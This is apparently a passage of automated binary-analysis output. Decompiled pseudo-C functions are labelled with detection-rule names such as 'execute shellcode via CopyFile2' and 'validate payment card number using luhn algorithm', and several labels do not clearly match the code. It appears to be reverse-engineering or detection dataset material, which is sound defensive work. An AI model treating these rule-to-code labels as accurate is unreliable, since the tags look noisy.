fcn.00032304(0x8e060);\n            return 0;\n        }\n        fcn.00063b80(arg1_00 + 2, 0);\n    }\ncode_r0x0005c824:\n    fcn.00030d24(arg1_00);\n    return iVar4;\n}\n",
        "token_count": 1629
    },
    "00065f14": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00065f14(void)\n\n{\n    int32_t iVar1;\n    uint uStack152;\n    ulong *puStack148;\n    uint uStack136;\n    ulong *puStack132;\n    ulong uStack120;\n    ulong uStack112;\n    uint uStack104;\n    ulong uStack88;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack148 = &uStack88;\n    uStack80 = *0x7dab8;\n    uStack76 = *0x7dabc;\n    uStack72 = *0x7dac0;\n    uStack68 = *0x7dac4;\n    uStack88 = 0x65dec;\n    uStack152 = 3;\n    uStack56 = *0x7dac8;\n    uStack52 = *0x7dacc;\n    uStack48 = *0x7dad0;\n    uStack44 = *0x7dad4;\n    uStack64 = 0x65e1c;\n    uStack136 = 1;\n    uStack32 = *0x7dad8;\n    uStack28 = *0x7dadc;\n    uStack24 = *0x7dae0;\n    uStack20 = *0x7dae4;\n    uStack40 = 0x65e34;\n    puStack132 = &uStack120;\n    uStack120 = *0x7daa0;\n    uStack112 = *0x7daa8;\n    uStack104 = *0x7dab0;\n    iVar1 = fcn.00065ccc(0x3ea, 0x8e358);\n    if (iVar1 == 0) {\n        (**(*0x8e358 + 0x28))(*0x8e358, 3, 1, &uStack152, &uStack136, 0x8e360);\n    }\n    return;\n}\n",
        "token_count": 493
    },
    "000661ec": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.000661ec(void)\n\n{\n    int32_t iVar1;\n    uint uStack136;\n    ulong *puStack132;\n    uint uStack120;\n    ulong *puStack116;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    uint uStack64;\n    uchar auStack60 [20];\n    ulong uStack40;\n    ulong uStack32;\n    uint uStack24;\n    \n    puStack116 = &uStack104;\n    uStack120 = 1;\n    uStack96 = *0x7db30;\n    uStack88 = *0x7db38;\n    uStack136 = 3;\n    uStack104 = 0x661dc;\n    puStack132 = &uStack80;\n    uStack80 = *0x7dae8;\n    uStack72 = *0x7daf0;\n    uStack64 = *0x7daf8;\n    fcn.0006670a(*0x7db30, auStack60, 0x7db00, 0x14);\n    uStack40 = *0x7db18;\n    uStack32 = *0x7db20;\n    uStack24 = *0x7db28;\n    iVar1 = fcn.00065ccc(0x3ea, 0x8e368);\n    if (iVar1 == 0) {\n        (**(*0x8e368 + 0x28))(*0x8e368, 2, 1, &uStack120, &uStack136, 0x8e370);\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "00066400": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00066400(void)\n\n{\n    int32_t iVar1;\n    uint uStack296;\n    ulong *puStack292;\n    ulong uStack280;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    ulong uStack256;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    ulong uStack232;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    ulong uStack208;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    ulong uStack184;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    ulong uStack160;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    ulong uStack112;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong uStack88;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack292 = &uStack280;\n    uStack272 = *0x7db50;\n    uStack268 = *0x7db54;\n    uStack264 = *0x7db58;\n    uStack260 = *0x7db5c;\n    uStack280 = 0x66308;\n    uStack296 = 0xb;\n    uStack248 = *0x7db60;\n    uStack244 = *0x7db64;\n    uStack240 = *0x7db68;\n    uStack236 = *0x7db6c;\n    uStack256 = 0x6631c;\n    uStack232 = 0x66328;\n    uStack224 = *0x7db70;\n    uStack220 = *0x7db74;\n    uStack216 = *0x7db78;\n    uStack212 = *0x7db7c;\n    uStack200 = *0x7db80;\n    uStack196 = *0x7db84;\n    uStack192 = *0x7db88;\n    uStack188 = *0x7db8c;\n    uStack208 = 0x66354;\n    uStack176 = *0x7db90;\n    uStack172 = *0x7db94;\n    uStack168 = *0x7db98;\n    uStack164 = *0x7db9c;\n    uStack184 = 0x66364;\n    uStack152 = *0x7dba0;\n    uStack148 = *0x7dba4;\n    uStack144 = *0x7dba8;\n    uStack140 = *0x7dbac;\n    uStack160 = 0x66370;\n    uStack136 = 0x6639c;\n    uStack112 = 0x663bc;\n    uStack128 = *0x7dbb0;\n    uStack124 = *0x7dbb4;\n    uStack120 = *0x7dbb8;\n    uStack116 = *0x7dbbc;\n    uStack88 = 0x663d0;\n    uStack104 = *0x7dbc0;\n    uStack100 = *0x7dbc4;\n    uStack96 = *0x7dbc8;\n    uStack92 = *0x7dbcc;\n    uStack64 = 0x663e4;\n    uStack40 = 0x663f4;\n    uStack80 = *0x7dbd0;\n    uStack76 = *0x7dbd4;\n    uStack72 = *0x7dbd8;\n    uStack68 = *0x7dbdc;\n    uStack56 = *0x7dbe0;\n    uStack52 = *0x7dbe4;\n    uStack48 = *0x7dbe8;\n    uStack44 = *0x7dbec;\n    uStack32 = *0x7dbf0;\n    uStack28 = *0x7dbf4;\n    uStack24 = *0x7dbf8;\n    uStack20 = *0x7dbfc;\n    iVar1 = fcn.00065ccc(0x3ea, 0x8e378);\n    if (iVar1 == 0) {\n        (**(*0x8e378 + 0x28))(*0x8e378, 4, 1, &uStack296, 0, 0x8e380);\n    }\n    return;\n}\n",
        "token_count": 1130
    },
    "000172b8": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.000172b8(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    uchar in_R9B;\n    uchar in_stack_00000028;\n    uchar auStack56 [16];\n    \n    puVar1 = fcn.00030cc4(0x28);\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        *(puVar1 + 4) = in_R9B;\n        puVar1[1] = arg1;\n        puVar1[2] = arg2;\n        puVar1[3] = arg3;\n        *(puVar1 + 0x21) = in_stack_00000028;\n        fcn.00032650(0x7dcd8, auStack56, 1);\n        *puVar1 = *0x7dcf0;\n        *0x7dcf0 = puVar1;\n        fcn.00032684(0x7dcd8, auStack56, 1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 260
    },
    "0001ac10": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0001ac10(ulong noname_0, ulong noname_1, ulong arg3, int64_t *arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (arg4 == NULL) {\n        uVar1 = 0xc000000d;\n    }\n    else {\n        iVar2 = (**0x11140)(noname_0, noname_1, 0, 0, 0);\n        if (iVar2 == 0) {\n            uVar1 = 0xc0000001;\n        }\n        else {\n            (**0x11138)(iVar2, 0, arg3);\n            *arg4 = iVar2;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 173
    },
    "0001acb4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0001acb4(int64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong *in_stack_00000028;\n    \n    if (arg1 == NULL) {\n        uVar1 = 0xc00000ef;\n    }\n    else {\n        uVar1 = fcn.0001ac10(*arg1, arg2, arg4, in_stack_00000028);\n        if (uVar1 == 0) {\n            iVar2 = (**0x11230)(*in_stack_00000028, arg2 & 0xffffffffffffff00 | noname_2, 1, 0, 0, 0x10);\n            if (iVar2 == 0) {\n                fcn.0001ac80(*arg1, *in_stack_00000028);\n                uVar1 = 0xc0000001;\n            }\n            else {\n                *arg1 = iVar2;\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 244
    },
    "00021060": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.00021060(ulong arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int64_t arg1_00;\n    bool bVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t arg2_00;\n    int64_t aiStackX24 [2];\n    uchar auStack56 [16];\n    \n    arg2_00 = arg1;\n    bVar2 = false;\n    iVar3 = fcn.00020f54(aiStackX24, arg1, 2, auStack56);\n    iVar4 = aiStackX24[0];\n    if (iVar3 == 0) {\n        bVar2 = true;\n        if (arg2 == 0) {\n            piVar1 = aiStackX24[0] + 4;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 != 0) goto code_r0x00021188;\n        }\n        if (0 < *(aiStackX24[0] + 0x68)) {\n            fcn.000207cc(auStack56);\n            arg1_00 = iVar4 + 0x70;\n            iVar3 = fcn.00032734(arg1_00);\n            if (iVar3 != 0) {\n                fcn.0002fcb8(arg1_00);\n                iVar4 = iVar4 + 0x78;\n                iVar3 = fcn.00032734(iVar4);\n                if (iVar3 != 0) {\n                    fcn.00032748(iVar4, 0);\n                }\n                fcn.0002fc94(arg1_00);\n                iVar3 = fcn.00032734(iVar4);\n                if (iVar3 != 0) {\n                    fcn.00032710(iVar4);\n                }\n            }\n            iVar3 = fcn.00020f54(aiStackX24, arg2_00, 2, auStack56);\n        }\n    }\n    iVar4 = *(arg2_00 * 8 + 0x8e8d0);\n    if (iVar4 != 0) {\n        (**(*(iVar4 + 0x58) + 0x10))(*(aiStackX24[0] + 0x60));\n        fcn.000206a8(*(arg2_00 * 8 + 0x8e8d0));\n        fcn.00030d24(*(*(arg2_00 * 8 + 0x8e8d0) + 0x50));\n    }\n    if (iVar3 == 0) {\n        fcn.000207cc(auStack56);\n        bVar2 = false;\n        fcn.00030514(aiStackX24[0] + 0x88);\n    }\n    fcn.00030d24(*(arg2_00 * 8 + 0x8e8d0));\n    *(arg2_00 * 8 + 0x8e8d0) = 0;\n    if (!bVar2) {\n        return 0;\n    }\ncode_r0x00021188:\n    fcn.000207cc(auStack56);\n    return 0;\n}\n",
        "token_count": 702
    },
    "00023ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.00023ed0(void)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint32_t auStackX8 [2];\n    int64_t aiStackX16 [3];\n    \n    uVar3 = fcn.0002748c(1, 0);\n    iVar4 = fcn.00022138(uVar3, 0, auStackX8, aiStackX16);\n    if (iVar4 == 0) {\n        uVar3 = 0;\n        if (auStackX8[0] != 0) {\n            iVar5 = 0;\n            do {\n                iVar2 = aiStackX16[0];\n                uVar1 = *(iVar5 + 0x2c + aiStackX16[0]);\n                if (*(iVar5 + 0x30 + aiStackX16[0]) == uVar1) {\n                    fcn.00023c98(*(iVar5 + aiStackX16[0]), *(iVar5 + 4 + aiStackX16[0]), uVar1, \n                                 *(iVar5 + 0xc + aiStackX16[0]));\n                }\n                else {\n                    iVar4 = fcn.00031204(0);\n                    if (iVar4 - *(iVar5 + 0x20 + iVar2) < 0x93a81) {\n                        if (uVar3 == auStackX8[0] - 1) break;\n                        fcn.00027a4c(5, 0, 0x215901f6, 0);\n                        fcn.0002225c(*(iVar5 + aiStackX16[0]), *(iVar5 + 8 + aiStackX16[0]), \n                                     *(iVar5 + 4 + aiStackX16[0]));\n                    }\n                    else {\n                        fcn.0002225c(*(iVar5 + iVar2), *(iVar5 + 8 + iVar2), *(iVar5 + 4 + iVar2));\n                        fcn.00027a4c(5, 0x21590204, 0x21590002, 0);\n                        fcn.000226e8(0xffffffff, 1, *(iVar5 + 0xc + aiStackX16[0]), 0);\n                    }\n                }\n                uVar3 = uVar3 + 1;\n                iVar5 = iVar5 + 0x40;\n            } while (uVar3 < auStackX8[0]);\n        }\n        fcn.000207c4(aiStackX16[0]);\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "000270b0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t fcn.000270b0(uint *arg1)\n\n{\n    int32_t iVar1;\n    uchar auStack24 [16];\n    \n    iVar1 = fcn.00027030(auStack24, 0x10);\n    if (iVar1 == 0) {\n        *arg1 = 0xfffffffd;\n    }\n    else {\n        if (iVar1 != 5) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n        *arg1 = 0xfffffffe;\n    }\n    return 0;\n}\n",
        "token_count": 126
    },
    "0002a068": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.0002a068(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    ulong arg4;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    \n    aiStackX24[0] = 0;\n    fcn.00030310(0x7ee10);\n    iVar1 = fcn.00022138(0xfffffffe, 8, auStackX16, aiStackX24);\n    if (iVar1 == 0) {\n        uVar4 = 0;\n        if (auStackX16[0] != 0) {\n            iVar3 = 0;\n            uVar2 = auStackX16[0];\n            do {\n                if (*(iVar3 + 0x10 + aiStackX24[0]) == arg1) {\ncode_r0x0002a0c7:\n                    arg4 = 0;\ncode_r0x0002a0d2:\n                    fcn.0002231c(*(iVar3 + aiStackX24[0]), *(iVar3 + 8 + aiStackX24[0]), *(iVar3 + 4 + aiStackX24[0]), \n                                 arg4);\n                    fcn.00029f80(*(iVar3 + 0xc + aiStackX24[0]));\n                    uVar2 = auStackX16[0];\n                }\n                else if (*(iVar3 + 0x1c + aiStackX24[0]) == arg1) {\n                    if (*(iVar3 + 0x10 + aiStackX24[0]) == arg1) goto code_r0x0002a0c7;\n                    arg4 = 3;\n                    goto code_r0x0002a0d2;\n                }\n                uVar4 = uVar4 + 1;\n                iVar3 = iVar3 + 0x40;\n            } while (uVar4 < uVar2);\n        }\n    }\n    fcn.00030378(0x7ee10);\n    fcn.000207c4(aiStackX24[0]);\n    return;\n}\n",
        "token_count": 477
    },
    "0002a128": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.0002a128(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    \n    aiStackX24[0] = 0;\n    fcn.00030310(0x7ee10);\n    iVar1 = fcn.00022138(0xfffffffe, 8, auStackX16, aiStackX24);\n    if ((iVar1 == 0) && (uVar3 = 0,  auStackX16[0] != 0)) {\n        iVar2 = 0;\n        do {\n            if (arg1 != 0) {\n                fcn.0002231c(*(iVar2 + aiStackX24[0]), *(iVar2 + 8 + aiStackX24[0]), *(iVar2 + 4 + aiStackX24[0]), 2);\n            }\n            fcn.00029f80(*(iVar2 + 0xc + aiStackX24[0]));\n            uVar3 = uVar3 + 1;\n            iVar2 = iVar2 + 0x40;\n        } while (uVar3 < auStackX16[0]);\n    }\n    fcn.00030378(0x7ee10);\n    fcn.000207c4(aiStackX24[0]);\n    return;\n}\n",
        "token_count": 314
    },
    "000312a0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.000312a0(uint16_t *arg1, uint16_t **arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint auStackX16 [6];\n    uchar auStack40 [16];\n    \n    fcn.00066704(auStack40);\n    iVar1 = fcn.00066896(auStack40, arg3, auStackX16);\n    if (iVar1 != 0) {\n        auStackX16[0] = 0;\n    }\n    if (arg2 != NULL) {\n        for (; (((0x2f < *arg1 && (*arg1 < 0x3a)) || ((0x60 < *arg1 && (*arg1 < 0x67)))) ||\n               ((0x40 < *arg1 && (*arg1 < 0x47)))); arg1 = arg1 + 1) {\n        }\n        *arg2 = arg1;\n    }\n    return auStackX16[0];\n}\n",
        "token_count": 216
    },
    "000321f4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.000321f4(int32_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = 0;\n    iVar3 = 1;\n    (*_fcn.00011630)(*(arg1 + 4) + 0x40, 0, 0, 0, 0);\n    piVar1 = arg1 + 2;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        if (arg1[1] < 1) {\n            iVar2 = *arg1;\n            if (0 < iVar2) {\n                *arg1 = 0;\n                iVar4 = *(arg1 + 4);\n                arg1[2] = iVar2;\n                iVar3 = iVar2;\n            }\n        }\n        else {\n            arg1[2] = -1;\n            iVar4 = *(arg1 + 4) + 0x20;\n            arg1[1] = arg1[1] + -1;\n        }\n    }\n    (**0x113b0)(*(arg1 + 4) + 0x40, 0);\n    if (iVar4 != 0) {\n        (**0x11420)(iVar4, 0, iVar3, 0);\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "00032304": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.00032304(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = 0;\n    (*_fcn.00011630)(*(arg1 + 4) + 0x40, 0, 0, 0, 0);\n    arg1[2] = 0;\n    iVar2 = 1;\n    if (arg1[1] < 1) {\n        iVar1 = *arg1;\n        if (0 < iVar1) {\n            *arg1 = 0;\n            iVar3 = *(arg1 + 4);\n            arg1[2] = iVar1;\n            iVar2 = iVar1;\n        }\n    }\n    else {\n        arg1[2] = -1;\n        iVar3 = *(arg1 + 4) + 0x20;\n        arg1[1] = arg1[1] + -1;\n    }\n    (**0x113b0)(*(arg1 + 4) + 0x40, 0);\n    if (iVar3 != 0) {\n        (**0x11420)(iVar3, 0, iVar2, 0);\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "000335c4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t fcn.000335c4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    uchar auStackX32 [8];\n    uchar auStack56 [16];\n    \n    arg1_00 = 0;\n    fcn.00032650(0x7f8f0, auStack56, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        fcn.00032650(iVar1 + 0x448, auStackX32, 1);\n        arg1_00 = *(iVar1 + 0x438);\n        *(iVar1 + 0x438) = arg2;\n        *(iVar1 + 0x440) = arg3;\n        fcn.00032684(iVar1 + 0x448, auStackX32, 1);\n    }\n    fcn.00032684(0x7f8f0, auStack56, 0);\n    fcn.00030d24(arg1_00);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 264
    },
    "00033b74": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nbool fcn.00033b74(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    bool bVar3;\n    uchar auStack56 [16];\n    \n    bVar3 = false;\n    fcn.00032650(0x7f8f0, auStack56, 0);\n    iVar2 = fcn.00032d34(arg1, 1);\n    if ((iVar2 != 0) && (*(iVar2 + 0x438) != 0)) {\n        iVar1 = fcn.00056584(*(iVar2 + 0x438), arg2, arg3, arg4);\n        bVar3 = iVar1 != 0;\n    }\n    fcn.00032684(0x7f8f0, auStack56, 0);\n    return bVar3;\n}\n",
        "token_count": 198
    },
    "0003a560": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0003a560(ulong param_1)\n\n{\n    ulong uVar1;\n    int64_t iStackX16;\n    ulong auStackX24 [2];\n    \n    uVar1 = 0;\n    auStackX24[0] = 0;\n    iStackX16 = 0;\n    (*_fcn.00011080)(param_1, auStackX24, &iStackX16, 0, 0, 0);\n    if (iStackX16 != 0) {\n        uVar1 = (*_fcn.000114a8)(*(iStackX16 + 8), 0x4e4d4944);\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "0003a814": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.0003a814(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    uint uStackX16;\n    ushort uStackX20;\n    \n    iVar1 = fcn.0003a5b4(arg1, 0, 0x1010102, &uStackX16);\n    if (iVar1 != 0) {\n        uStackX16 = 0;\n        uStackX20 = 0;\n    }\n    fcn.000330cc(arg1 & 0xffffffff, &uStackX16, 6);\n    return;\n}\n",
        "token_count": 127
    },
    "0003f678": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.0003f678(int64_t arg1, ulong noname_1, int64_t arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int16_t in_R9W;\n    ulong *puVar3;\n    bool bVar4;\n    uchar auStack56 [16];\n    \n    iVar2 = 0;\n    fcn.00032650(0x80338, auStack56, 0);\n    puVar3 = *0x80350;\n    do {\n        if (puVar3 == NULL) {\ncode_r0x0003f722:\n            fcn.00032684(0x80338, auStack56, 0);\n            return iVar2;\n        }\n        if (((*(puVar3 + 1) == 0x17) && (*(puVar3 + 0x21) == noname_1)) && (*(puVar3 + 0x10a) == in_R9W)) {\n            bVar4 = puVar3[0x12] < *(arg3 + 8);\n            if ((puVar3[0x12] != *(arg3 + 8)) ||\n               (bVar4 = puVar3[0x13] < *(arg3 + 0x10),  iVar1 = iVar2,  puVar3[0x13] != *(arg3 + 0x10))) {\n                iVar1 = (1 - bVar4) - (bVar4 != 0);\n            }\n            if (iVar1 == 0) {\n                bVar4 = puVar3[2] < *(arg1 + 8);\n                if ((puVar3[2] != *(arg1 + 8)) ||\n                   (bVar4 = puVar3[3] < *(arg1 + 0x10),  iVar1 = iVar2,  puVar3[3] != *(arg1 + 0x10))) {\n                    iVar1 = (1 - bVar4) - (bVar4 != 0);\n                }\n                if (iVar1 == 0) {\n                    iVar2 = 1;\n                    goto code_r0x0003f722;\n                }\n            }\n        }\n        puVar3 = *puVar3;\n    } while( true );\n}\n",
        "token_count": 496
    },
    "00044d9c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.00044d9c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t arg2;\n    uchar auStack24 [16];\n    \n    fcn.00046d64(*(arg1 + 0xc0), *(arg1 + 200), *(arg1 + 0xd0));\n    iVar1 = *(arg1 + 0x30);\n    if (0 < iVar1) {\n        if (iVar1 < 5) {\n            arg2 = 0x44a98;\n            goto code_r0x00044e26;\n        }\n        if (iVar1 == 5) {\n            arg2 = 0x43c64;\n            goto code_r0x00044e26;\n        }\n        if (5 < iVar1) {\n            if (iVar1 < 8) {\n                arg2 = 0x43f84;\n                goto code_r0x00044e26;\n            }\n            if (iVar1 == 9) {\n                arg2 = 0x45038;\n                goto code_r0x00044e26;\n            }\n            if (iVar1 == 0xb) {\n                arg2 = 0x44550;\n                goto code_r0x00044e26;\n            }\n            if (iVar1 == 0xc) {\n                arg2 = *(arg1 + 0xd8);\n                goto code_r0x00044e26;\n            }\n        }\n    }\n    arg2 = 0;\ncode_r0x00044e26:\n    if (arg2 == 0) {\n        fcn.00046db4(*(arg1 + 0x20), *(arg1 + 0x28));\n        fcn.00046dd8(arg1);\n    }\n    else {\n        iVar1 = fcn.0001a9b0(auStack24, arg2, arg1);\n        if (iVar1 == 0) {\n            fcn.00032710(auStack24);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 438
    },
    "000460a0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.000460a0(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    uint uStackX16;\n    ushort uStackX20;\n    \n    iVar1 = fcn.00045ca8(arg1, 0, 0x1010102, &uStackX16);\n    if (iVar1 != 0) {\n        uStackX16 = 0;\n        uStackX20 = 0;\n    }\n    fcn.000330cc(arg1 & 0xffffffff, &uStackX16, 6);\n    return;\n}\n",
        "token_count": 125
    },
    "0004841c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0004841c(int64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    iVar1 = *(arg1 + 0x18);\n    if (iVar1 != 0) {\n        if (*(iVar1 + 5) == '\\x10') {\n            bVar3 = *(iVar1 + 8) < *0x15bb0;\n            if ((*(iVar1 + 8) == *0x15bb0) && (bVar3 = *(iVar1 + 0x10) < *0x15bb8,  *(iVar1 + 0x10) == *0x15bb8)) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = (1 - bVar3) - (bVar3 != 0);\n            }\n            if (iVar2 == 0) {\n                iVar2 = fcn.00046f10(*(arg2 + 0x28), *(arg2 + 0x30), 1, 0);\n                if (iVar2 == 0) {\n                    *arg3 = 0x472d0;\n                    arg3[1] = *(arg2 + 0x30);\n                    return 1;\n                }\n                goto code_r0x00048494;\n            }\n        }\n        if (*(iVar1 + 5) == '\\x11') {\n            bVar3 = *(iVar1 + 8) < *0x15bc8;\n            if (((*(iVar1 + 8) == *0x15bc8) && (bVar3 = *(iVar1 + 0x10) < *0x15bd0,  *(iVar1 + 0x10) == *0x15bd0)) &&\n               (bVar3 = *(iVar1 + 0x18) < 